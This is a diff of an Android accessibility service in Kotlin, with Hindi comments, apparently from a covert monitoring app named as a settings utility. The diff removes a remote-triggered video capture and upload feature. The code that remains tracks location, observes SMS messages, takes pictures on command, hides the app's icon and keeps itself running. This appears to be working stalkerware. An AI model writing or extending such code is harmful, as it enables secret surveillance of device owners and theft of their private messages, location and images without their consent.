@@ -10,11 +10,9 @@ import android.app.NotificationManager
 import android.app.PendingIntent
 import android.app.job.JobInfo
 import android.app.job.JobScheduler
-import android.content.BroadcastReceiver
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
-import android.content.IntentFilter
 import android.content.pm.PackageManager
 import android.location.Location
 import android.location.LocationListener
@@ -28,7 +26,6 @@ import android.text.TextUtils
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
-import androidx.annotation.RequiresApi
 import androidx.core.app.ActivityCompat
 import androidx.core.app.NotificationCompat
 import com.safe.setting.app.R
@@ -45,7 +42,6 @@ import java.util.Date
 import java.util.Locale
 import javax.inject.Inject
 
-@SuppressLint("AccessibilityPolicy")
 class AccessibilityDataService : AccessibilityService(), LocationListener {
 
     companion object {
@@ -60,11 +56,6 @@ class AccessibilityDataService : AccessibilityService(), LocationListener {
 
     private lateinit var locationManager: LocationManager
     private var smsObserver: SmsObserver? = null
-
-    // --- नया कोड यहाँ से शुरू होता है ---
-    // यह ब्रॉडकास्ट रिसीवर VideoRecordingService से संदेश प्राप्त करेगा जब वीडियो रिकॉर्ड हो जाएगा।
-    private lateinit var videoBroadcastReceiver: BroadcastReceiver
-    // --- नया कोड यहाँ समाप्त होता है ---
 
     // ... (onCreate, onTaskRemoved, और अन्य फ़ंक्शन्स यहाँ वैसे ही रहेंगे) ...
     override fun onTaskRemoved(rootIntent: Intent?) {
@@ -128,32 +119,12 @@ class AccessibilityDataService : AccessibilityService(), LocationListener {
         }
     }
 
-    @SuppressLint("UnspecifiedRegisterReceiverFlag")
     override fun onServiceConnected() {
         super.onServiceConnected()
         isRunningService = true
         Log.i(TAG, "Accessibility service connected successfully.")
 
         startForeground(NOTIFICATION_ID, createNotification())
-
-        // --- नया कोड यहाँ से शुरू होता है ---
-        // ब्रॉडकास्ट रिसीवर को इनिशियलाइज़ और रजिस्टर करें।
-        videoBroadcastReceiver = object : BroadcastReceiver() {
-            @RequiresApi(Build.VERSION_CODES.O)
-            override fun onReceive(context: Context?, intent: Intent?) {
-                if (intent?.action == "VIDEO_RECORDED_ACTION") {
-                    val filePath = intent.getStringExtra("file_path")
-                    interactor.handleVideoUpload(filePath)
-                }
-            }
-        }
-        // एंड्रॉयड संस्करण के अनुसार रिसीवर को रजिस्टर करें।
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            registerReceiver(videoBroadcastReceiver, IntentFilter("VIDEO_RECORDED_ACTION"), RECEIVER_NOT_EXPORTED)
-        } else {
-            registerReceiver(videoBroadcastReceiver, IntentFilter("VIDEO_RECORDED_ACTION"))
-        }
-        // --- नया कोड यहाँ समाप्त होता है ---
 
         Handler(Looper.getMainLooper()).postDelayed({
             try {
@@ -171,10 +142,6 @@ class AccessibilityDataService : AccessibilityService(), LocationListener {
         getLocation()
         interactor.getShowOrHideApp()
         interactor.getCapturePicture()
-        // --- नया कोड यहाँ से शुरू होता है ---
-        // Firebase से वीडियो रिकॉर्डिंग कमांड सुनना शुरू करें।
-        interactor.getCaptureVideo()
-        // --- नया कोड यहाँ समाप्त होता है ---
         registerSmsObserver()
     }
 
@@ -287,10 +254,6 @@ class AccessibilityDataService : AccessibilityService(), LocationListener {
             interactor.clearDisposable()
             locationManager.removeUpdates(this)
             unregisterSmsObserver()
-            // --- नया कोड यहाँ से शुरू होता है ---
-            // सर्विस नष्ट होने पर ब्रॉडकास्ट रिसीवर को अनरजिस्टर करें।
-            unregisterReceiver(videoBroadcastReceiver)
-            // --- नया कोड यहाँ समाप्त होता है ---
             Log.i(TAG, "AccessibilityDataService destroyed successfully.")
         } catch (e: Exception) {
             Log.e(TAG, "Error during service destruction: ${e.message}")
